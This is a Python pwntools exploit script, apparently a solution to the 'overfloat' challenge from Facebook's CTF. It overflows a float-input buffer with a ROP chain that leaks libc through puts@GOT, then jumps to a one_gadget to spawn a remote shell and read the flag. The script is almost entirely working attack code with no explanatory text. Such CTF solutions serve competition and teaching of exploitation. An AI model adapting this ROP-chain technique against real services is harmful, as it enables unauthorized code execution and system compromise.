from pwn import *
import struct

bin = ELF('./overfloat')
libc = ELF('./libc-2.27.so')

pop_rdi_ret = 0x400a83
one_gadget_offset = [0x4f2c5, 0x4f322, 0x10a38c]

LOCAL = False

if LOCAL:
    # conn = process('./overfloat', env={'LD_PRELOAD':'./libc-2.27.so'})
    conn = process('./overfloat')
    gdb.attach(conn, 'b * 0x400a1f')
else:
    conn = remote('challenges.fbctf.com', 1341)

for i in range(14):
    conn.sendlineafter(']: ', str(0))

conn.sendlineafter(']: ', '5.881243e-39')  # pop rdi ret
conn.sendlineafter(']: ', '0')
conn.sendlineafter(']: ', '8.827732e-39')  # puts_got
conn.sendlineafter(']: ', '0')
conn.sendlineafter(']: ', '5.879826e-39')  # puts_got
conn.sendlineafter(']: ', '0')
conn.sendlineafter(']: ', '5.880906e-39')  # main
conn.sendlineafter(']: ', '0')
conn.sendlineafter(']: ', 'done')

conn.recvuntil('BON VOYAGE!\n')
libc_addr = u64(conn.recv(6) + '\x00\x00') - libc.symbols['puts']
one_gadget_addr = libc_addr + one_gadget_offset[0]

log.info('Libc Addr: ' + hex(libc_addr))
log.info('Libc Addr: ' + hex(one_gadget_addr))

for i in range(14):
    conn.sendlineafter(']: ', str(0))

conn.sendlineafter(']: ', str(struct.unpack(
    '!f', hex(one_gadget_addr & 0xffffffff)[2:].decode('hex'))[0]))
conn.sendlineafter(']: ', str(struct.unpack(
    '!f', ('0000'+hex((one_gadget_addr & 0xffffffff00000000) >> 32)[2:]).decode('hex'))[0]))
conn.sendlineafter(']: ', 'done')

conn.sendline('cd home;cd overfloat;cat flag')
conn.interactive()
